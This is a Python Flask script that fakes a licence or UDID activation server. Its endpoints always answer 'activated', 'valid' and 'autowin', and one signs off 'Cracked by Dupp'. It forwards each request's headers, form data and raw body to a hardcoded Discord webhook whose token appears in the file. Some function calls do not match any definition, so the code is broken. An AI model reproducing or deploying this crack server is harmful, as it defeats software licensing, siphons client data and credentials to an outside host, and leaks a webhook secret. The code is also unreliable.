from flask import Flask, request, jsonify
import os
os.system('pip install requests')
import requests
import json

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1459885767114489989/GWXlATcxonVZw7rgZf6zZDeh1r6VnJF9E0RFlIqkXR1a3Sjs3p7PLg7v6Tpp3gLDqTJM"

def send_to_discord():
    data = {
        "method": request.method,
        "url": request.url,
        "headers": dict(request.headers),
        "args": request.args.to_dict(),
        "form": request.form.to_dict(),
        "json": request.get_json(silent=True),
        "raw": request.get_data(as_text=True)
    }

    content = "```json\n" + json.dumps(data, indent=2, ensure_ascii=False) + "\n```"

    requests.post(WEBHOOK_URL, json={
        "content": content
    })

@app.route("/active_udid", methods=["GET", "POST"])
def active_udid():
    data = collect_request_data()
    send_to_discord("ACTIVE_UDID", data)

    return jsonify({
        "status": "success",
        "activated": True,
        "message": "Cracked by Dupp 🤪"
    })


@app.route('/verify_udid', methods=['POST'])
def verify_udid():
    data = request.get_json(force=True)

    return jsonify({
        "status": "success",
        "valid": True,
        "active": True,
        "autowin": True,
        "client": data
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
